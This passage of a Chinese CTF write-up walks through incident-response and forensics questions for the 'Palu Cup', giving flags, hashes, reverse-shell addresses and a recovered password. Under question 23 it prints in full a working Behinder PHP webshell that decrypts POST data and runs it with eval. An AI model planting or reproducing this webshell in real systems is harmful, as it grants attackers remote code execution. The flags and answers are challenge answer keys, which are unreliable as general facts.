+<p><img src="https://ooo.0x0.ooo/2024/04/22/OpeTqc.png" alt="OpeTqc.png" loading="lazy"><br>john跑一下palu.com的hash爆破出来<code>123123</code><br><code>[4297f44b13955235245b2497399d7a93]</code></p>
+<h3 id="应急响应-15"><a href="#应急响应-15" class="headerlink" title="应急响应-15"></a>应急响应-15</h3><blockquote>
+<p>提交测试数据条数</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/OpeUAr.png" alt="OpeUAr.png" loading="lazy"><br>5条<br><code>[e4da3b7fbbce2345d7772b0674a318d5]</code></p>
+<h3 id="应急响应-16"><a href="#应急响应-16" class="headerlink" title="应急响应-16"></a>应急响应-16</h3><blockquote>
+<p>请提交攻击者留下的信息</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/OpeWSM.png" alt="OpeWSM.png" loading="lazy"><br><code>[flag&#123;hi_palu_f10g&#125;]</code></p>
+<h3 id="应急响应-17"><a href="#应急响应-17" class="headerlink" title="应急响应-17"></a>应急响应-17</h3><blockquote>
+<p>请提交运维服务器上的恶意文件md5（小写32位md5值）</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/OpebCG.png" alt="OpebCG.png" loading="lazy"><br><code>[0fca0f847a45401c878d7a5303ddc1f8]</code></p>
+<h3 id="应急响应-18"><a href="#应急响应-18" class="headerlink" title="应急响应-18"></a>应急响应-18</h3><blockquote>
+<p>提交恶意文件的恶意函数</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/Opexn1.png" alt="Opexn1.png" loading="lazy"><br>helloworld下面有个libc，讲道理应该是haveadoor,但是是begingame<br><code>[ddd0599cda1fc289a617db148d75383b]</code></p>
+<h3 id="应急响应-19"><a href="#应急响应-19" class="headerlink" title="应急响应-19"></a>应急响应-19</h3><blockquote>
+<p>请提交攻击者恶意注册的恶意用户条数</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/Opez4I.png" alt="Opez4I.png" loading="lazy"><br>10个恶意用户<br><code>[d3d9446802a44259755d38e6d163e820]</code></p>
+<h3 id="应急响应-20"><a href="#应急响应-20" class="headerlink" title="应急响应-20"></a>应急响应-20</h3><blockquote>
+<p>请提交对博客系统的第一次扫描时间</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/OpeF6D.png" alt="OpeF6D.png" loading="lazy"><br><code>[2024/04/16/21:03:46]</code></p>
+<h3 id="应急响应-21"><a href="#应急响应-21" class="headerlink" title="应急响应-21"></a>应急响应-21</h3><blockquote>
+<p>提交攻击者下载的文件</p>
+</blockquote>
+<p><code>[upload.zip]</code></p>
+<h3 id="应急响应-22"><a href="#应急响应-22" class="headerlink" title="应急响应-22"></a>应急响应-22</h3><blockquote>
+<p>请提交攻击者第一次下载服务器文件的时间</p>
+</blockquote>
+<p>没找到</p>
+<h3 id="应急响应-23"><a href="#应急响应-23" class="headerlink" title="应急响应-23"></a>应急响应-23</h3><blockquote>
+<p>请提交攻击者留下的冰蝎马的文件名称</p>
+</blockquote>
+<pre class="language-php" data-language="php"><code class="language-php">cat nidewen.php 
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$key</span><span class="token operator">=</span><span class="token string double-quoted-string">"1be873048db838ac"</span><span class="token punctuation">;</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$key</span><span class="token punctuation">;</span>
+<span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$post</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'openssl'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+<span class="token variable">$t</span><span class="token operator">=</span><span class="token string double-quoted-string">"base64_"</span><span class="token operator">.</span><span class="token string double-quoted-string">"decode"</span><span class="token punctuation">;</span>
+<span class="token variable">$post</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span>
+<span class="token punctuation">&#123;</span>
+<span class="token variable">$post</span><span class="token operator">=</span><span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"AES128"</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$arr</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$params</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+@<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
+<p><code>[nidewen.php]</code></p>
+<h3 id="应急响应-24"><a href="#应急响应-24" class="headerlink" title="应急响应-24"></a>应急响应-24</h3><blockquote>
+<p>提交冰蝎的链接密码</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/OpeikF.png" alt="OpeikF.png" loading="lazy"><br><code>[nidewen]</code></p>
+<h3 id="应急响应-25"><a href="#应急响应-25" class="headerlink" title="应急响应-25"></a>应急响应-25</h3><blockquote>
+<p>提交办公区存在的恶意用户名</p>
+</blockquote>
+<p>开机 PC01 看用户<br><code>[hacker]</code></p>
+<h3 id="应急响应-26"><a href="#应急响应-26" class="headerlink" title="应急响应-26"></a>应急响应-26</h3><blockquote>
+<p>提交恶意用户密码到期时间<br>net user hacker<br><code>[[2024/5/28/21:40:37]]</code></p>
+</blockquote>
+<h3 id="应急响应-27"><a href="#应急响应-27" class="headerlink" title="应急响应-27"></a>应急响应-27</h3><blockquote>
+<p>请对办公区留存的镜像取证并指出内存疑似恶意进程</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/Openm6.webp" alt="Openm6.webp" loading="lazy"><br><code>[.hack.ex]</code></p>
+<h3 id="应急响应-28"><a href="#应急响应-28" class="headerlink" title="应急响应-28"></a>应急响应-28</h3><blockquote>
+<p>请指出该员工使用的公司OA平台的密码</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKF6j.png" alt="OpKF6j.png" loading="lazy"><br>把pc1里面raw.raw导出用volatility3分析<br><img src="https://ooo.0x0.ooo/2024/04/23/OpKikp.png" alt="OpKikp.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/23/OpKnpU.png" alt="OpKnpU.png" loading="lazy"><br><code>[liuling7541]</code></p>
+<h3 id="应急响应-29"><a href="#应急响应-29" class="headerlink" title="应急响应-29"></a>应急响应-29</h3><blockquote>
+<p>攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpK1YY.png" alt="OpK1YY.png" loading="lazy"><br>查看剪切板里面有个h4ck3d!，是传入的木马<br><code>[h4ck3d!]</code></p>
+<h3 id="应急响应-30"><a href="#应急响应-30" class="headerlink" title="应急响应-30"></a>应急响应-30</h3><blockquote>
+<p>请提交该计算机中记录的重要联系人的家庭住址</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKN5v.png" alt="OpKN5v.png" loading="lazy"><br>找到一个中文乱码，看别人的wp发现是王总然后提取出来<br><code>[秋水省雁荡市碧波区千屿山庄1号]</code></p>
+<h3 id="应急响应-31"><a href="#应急响应-31" class="headerlink" title="应急响应-31"></a>应急响应-31</h3><blockquote>
+<p>请提交近源靶机上的恶意文件哈希</p>
+</blockquote>
+<p>pc2上有个artifact文件，用<code>Get-FileHash artifact.exe -Algorithm MD5</code>获取文件md5<br><img src="https://ooo.0x0.ooo/2024/04/23/OpKeKq.webp" alt="OpKeKq.webp" loading="lazy"><br><code>[a7fcd0b15a080167c4c2f05063802a6e]</code></p>
+<h3 id="应急响应-32"><a href="#应急响应-32" class="headerlink" title="应急响应-32"></a>应急响应-32</h3><blockquote>
+<p>提交恶意程序的外联地址</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKrSc.webp" alt="OpKrSc.webp" loading="lazy"><br><code>[101.78.63.44]</code></p>
+<h3 id="应急响应-33"><a href="#应急响应-33" class="headerlink" title="应急响应-33"></a>应急响应-33</h3><blockquote>
+<p>提交攻击者使用内网扫描工具的哈希</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKAwr.png" alt="OpKAwr.png" loading="lazy"><br>传的 fscan，看操作日志确定版本是 1.8.3<br><code>[1facdcd05c43ba4d37274dffc90b6d4e]</code></p>
+<h3 id="应急响应-34"><a href="#应急响应-34" class="headerlink" title="应急响应-34"></a>应急响应-34</h3><blockquote>
+<p>请提交攻击者在站点上留下的后门密码</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKZ1M.png" alt="OpKZ1M.png" loading="lazy"><br>看waf，连接密码是123<br><code>[123]</code></p>
+<h3 id="应急响应-35"><a href="#应急响应-35" class="headerlink" title="应急响应-35"></a>应急响应-35</h3><blockquote>
+<p>请提交攻击者在数据库留下的信息</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKvDG.png" alt="OpKvDG.png" loading="lazy"><br><code>[flag&#123;hack_palu&#125;]</code></p>
+<h3 id="应急响应-36"><a href="#应急响应-36" class="headerlink" title="应急响应-36"></a>应急响应-36</h3><blockquote>
+<p>提交攻击者在监控服务器上留下的dcnlog地址</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKy81.png" alt="OpKy81.png" loading="lazy"><br><code>[oalu.dcnlog.cn]</code></p>
+<h3 id="应急响应-37"><a href="#应急响应-37" class="headerlink" title="应急响应-37"></a>应急响应-37</h3><blockquote>
+<p>提交监控服务器上恶意用户的上一次登录时间</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKmkI.png" alt="OpKmkI.png" loading="lazy"><br><code>[2024/04/17/01:32:44]</code></p>
+<h3 id="应急响应-38"><a href="#应急响应-38" class="headerlink" title="应急响应-38"></a>应急响应-38</h3><blockquote>
+<p>提交监控服务器上遗留的反弹shell地址和端口</p>
+</blockquote>
+<p>同36图，base64解码<br><img src="https://ooo.0x0.ooo/2024/04/23/OpKppD.png" alt="OpKppD.png" loading="lazy"><br><code>[154.183.110.12:7890]</code></p>
+<h3 id="应急响应-39"><a href="#应急响应-39" class="headerlink" title="应急响应-39"></a>应急响应-39</h3><blockquote>
+<p>提交恶意钓鱼文件的哈希</p>
+</blockquote>
+<p>pc2有个初稿文件，应该是钓鱼文件<br><img src="https://ooo.0x0.ooo/2024/04/23/OpKR56.png" alt="OpKR56.png" loading="lazy"><br><code>[[da75025ff7f3b6baa27f5913c1c83063]]</code></p>
+<h3 id="应急响应-40"><a href="#应急响应-40" class="headerlink" title="应急响应-40"></a>应急响应-40</h3><blockquote>
+<p>提交恶意文件外连IP</p>
+</blockquote>
+<p>不会</p>
+<h3 id="应急响应-41"><a href="#应急响应-41" class="headerlink" title="应急响应-41"></a>应急响应-41</h3><blockquote>
+<p>提交被恶意文件钓鱼使用者的姓名</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKJfF.png" alt="OpKJfF.png" loading="lazy"><br><code>[陈琚鹭]</code></p>
+<h3 id="应急响应-42"><a href="#应急响应-42" class="headerlink" title="应急响应-42"></a>应急响应-42</h3><blockquote>
+<p>提交攻击者留下的信息</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKtKP.webp" alt="OpKtKP.webp" loading="lazy"><br><code>flag&#123;2024-04-17-hi&#125;</code></p>
+<h3 id="应急响应-43"><a href="#应急响应-43" class="headerlink" title="应急响应-43"></a>应急响应-43</h3><blockquote>
+<p>提交恶意用户数量</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpK40b.png" alt="OpK40b.png" loading="lazy"><br>49个<br><code>[f457c545a9ded88f18ecee47145a72c0]</code></p>
+<h3 id="应急响应-44"><a href="#应急响应-44" class="headerlink" title="应急响应-44"></a>应急响应-44</h3><blockquote>
+<p>请提交员工集体使用的密码</p>
+</blockquote>
+<p>试了一下Network@2020对了<br><code>[Network@2020]</code></p>
+<h3 id="应急响应-45"><a href="#应急响应-45" class="headerlink" title="应急响应-45"></a>应急响应-45</h3><blockquote>
+<p>提交加密文件的哈希</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKDwl.webp" alt="OpKDwl.webp" loading="lazy"><br><code>[2bf71a0d6d4e70cec7602da2b653e2ab]</code></p>
+<h3 id="应急响应-46"><a href="#应急响应-46" class="headerlink" title="应急响应-46"></a>应急响应-46</h3><blockquote>
+<p>提交被攻击者加密的内容明文</p>
+</blockquote>
+<p>同密码题<br><code>[2024ispassword]</code></p>
+<h3 id="应急响应-47"><a href="#应急响应-47" class="headerlink" title="应急响应-47"></a>应急响应-47</h3><blockquote>
+<p>请提交符合基线标准的服务器数量</p>
+</blockquote>
+<p>0个<br><code>[cfcd208495d565ef66e7dff9f98764da]</code></p>
+<h3 id="应急响应-48-51"><a href="#应急响应-48-51" class="headerlink" title="应急响应-48-51"></a>应急响应-48-51</h3><blockquote>
+<p>提交办公区的恶意文件哈希<br>提交恶意回连端口<br>提交恶意程序中的flag<br>提交恶意文件中的search_for_text内容</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKEHB.webp" alt="OpKEHB.webp" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/23/OpKL1g.webp" alt="OpKL1g.webp" loading="lazy"><br><code>[5232a191eb2913337e0a93b0a990f2a2]</code><br><code>[22]</code><br><code>[flag&#123;234567uyhgn_aiduyai&#125;]</code><br><code>[passwod]</code></p>
+<h3 id="应急响应-52"><a href="#应急响应-52" class="headerlink" title="应急响应-52"></a>应急响应-52</h3><blockquote>
+<p>提交web服务器上攻击者修改后的root密码</p>
+</blockquote>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/f79382a3/" title="第一届&quot;帕鲁杯&quot;wp">https://tao0845.github.io/posts/f79382a3/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/724f9cb4/" rel="prev" title="HackMyVM-Apaches"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">HackMyVM-Apaches</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/85f65919/" rel="next" title="HackMyVM-Principle"><span class="post-nav-text">HackMyVM-Principle</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
